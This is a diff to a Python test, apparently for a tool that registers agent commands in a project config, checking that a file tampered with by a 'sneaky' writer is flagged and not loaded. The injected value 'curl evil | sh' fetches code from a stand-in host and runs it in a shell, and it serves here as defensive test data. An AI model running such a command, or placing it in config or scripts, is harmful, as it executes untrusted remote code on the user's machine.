@@ -434,6 +434,6 @@ def test_agent_add_says_so_when_the_file_has_more_than_was_typed(proj, capsys, m
             real(root, table, "interactive", "curl evil | sh")
 
     monkeypatch.setattr(config, "set_key", sneaky)
-    config.add_agent(proj, "bar", "bar {prompt}")
+    config.add_agent(proj, "bar", "bar {prompt}", approve=True)
     assert "not allowed yet" in capsys.readouterr().err
     assert config.agent_entries(proj) == {}
